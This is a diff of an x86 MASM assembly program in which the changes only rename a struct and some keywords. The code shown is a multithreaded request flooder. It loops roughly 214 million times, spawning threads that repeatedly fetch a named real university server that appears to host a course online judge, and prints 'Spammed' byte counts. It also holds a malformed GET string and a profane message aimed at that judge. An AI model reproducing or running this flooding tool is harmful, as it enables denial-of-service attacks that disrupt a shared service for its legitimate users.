@@ -36,12 +36,12 @@ new_thread       PROTO :DWORD
 ; Our data section. Here we declare our strings for our message
 ; *************************************************************************
 .data
-	tblock STRUCT
- 		strn1 BYTE 260 dup (?)
-   		strn2 BYTE 260 dup (?)
-     	reserved DWORD ?             ; this is used internally
-     	thcount  DWORD ?             ; thread counter
-	tblock ENDS
+	WebRequest STRUCT
+ 		targetURL    BYTE  260 dup (?)
+   		saveFileName BYTE  260 dup (?)
+     	reserved     DWORD ?             ; thread lock
+     	thcount      DWORD ?             ; thread counter
+	WebRequest ENDS
 	
 	message	BYTE "Fuck Dxtx Struct oj! I haven't done hw 8!!!", 0         ; nweline 10
 	malreq  BYTE "GET +%z%+%z%+%z%+%z%+%z%+%z%&%$%$!@#$%^&^%%^%#^#^&%^*()*_()*%^%@#%$%^*.htm", 0
@@ -58,12 +58,12 @@ start:
 
 
 main PROC
-	LOCAL webreq:tblock
+	LOCAL webreq:WebRequest
          
 	mov ecx, 214783646
 	mov webreq.thcount, 0
-	cst ADDR webreq.strn1, "https://ds109.ncu.edu.tw/"
-    cst ADDR webreq.strn2, "hellworld.txt"    
+	cst ADDR webreq.targetURL, "https://ds109.ncu.edu.tw/"
+    cst ADDR webreq.saveFileName, "hellworld.txt"    
 		
 FuckOj:
 	push ecx	
@@ -87,7 +87,7 @@ main ENDP
 ; Threads
 ; *************************************************************************
 
-start_new_thread proc pthread:DWORD, pstruct:DWORD
+start_new_thread PROC pthread:DWORD, pstruct:DWORD
 
     LOCAL tID:DWORD
 
@@ -95,7 +95,7 @@ start_new_thread proc pthread:DWORD, pstruct:DWORD
 
   	; load the "reserved" flag address into ESI
     mov eax, pstruct
-    lea esi, (tblock PTR [eax]).reserved
+    lea esi, (WebRequest PTR [eax]).reserved
 
   	; now, set the "reserved" flag to 1
     mov DWORD PTR [esi], 1
@@ -113,9 +113,9 @@ start_new_thread proc pthread:DWORD, pstruct:DWORD
     mov eax, tID
     ret
 
-start_new_thread endp
+start_new_thread ENDP
 
-new_thread proc pstruct:DWORD
+new_thread PROC pstruct:DWORD
 
     LOCAL pst1  :DWORD
     LOCAL pst2  :DWORD
@@ -131,12 +131,12 @@ new_thread proc pstruct:DWORD
 
   	; copy args passed in structure to local variables
     mov edi, pstruct
-    lea esi, (tblock PTR [edi]).reserved
+    lea esi, (WebRequest PTR [edi]).reserved
 
   	; copy each string to a local buffer
-    lea ecx, (tblock PTR [edi]).strn1
+    lea ecx, (WebRequest PTR [edi]).targetURL
     cst pst1, ecx
-    lea ecx, (tblock PTR [edi]).strn2
+    lea ecx, (WebRequest PTR [edi]).saveFileName
     cst pst2, ecx
 
   	; reset the "reserved" flag back to zero to unlock calling thread
@@ -146,7 +146,7 @@ new_thread proc pstruct:DWORD
   	; GOGO POWER THREAD
   	; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
-    add (tblock PTR [edi]).thcount, 1       ; increment thread counter on start
+    add (WebRequest PTR [edi]).thcount, 1       ; increment thread counter on start
 
     ;print " "
     ;print pst2, 13, 10
@@ -159,12 +159,12 @@ new_thread proc pstruct:DWORD
     print "Spammed "
     print str$(flen)," bytes", 13,10
 
-    sub (tblock PTR [edi]).thcount, 1       ; decrement thread counter on exit
+    sub (WebRequest PTR [edi]).thcount, 1       ; decrement thread counter on exit
 
     pop edi
     pop esi
 
     ret
 
-new_thread endp
-end start
+new_thread ENDP
+END start
